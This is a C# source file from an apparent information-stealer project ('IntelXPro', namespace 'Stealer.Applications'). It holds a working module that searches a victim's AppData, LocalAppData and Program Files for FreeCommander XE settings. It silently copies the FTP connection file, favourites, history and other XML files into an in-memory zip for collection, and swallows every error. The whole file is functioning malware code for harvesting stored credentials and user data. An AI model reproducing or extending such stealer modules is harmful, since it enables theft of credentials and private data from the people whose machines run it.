using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FreeCommander : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FreeCommanderXE");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "FreeCommanderXE");
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "FreeCommander XE");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "FreeCommander";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string settingsPath = Path.Combine(basePath, "Settings");
                if (Directory.Exists(settingsPath))
                {
                    string[] configFiles = new string[]
                    {
                        "FreeCommander.ini",
                        "FreeCommander.fav.xml",
                        "FreeCommander.ftp.xml",
                        "FreeCommander.hist.xml"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(settingsPath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\FreeCommander\\{location}\\Settings\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string[] xmlFiles = Directory.GetFiles(settingsPath, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in xmlFiles.Take(10))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\FreeCommander\\{location}\\Settings\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
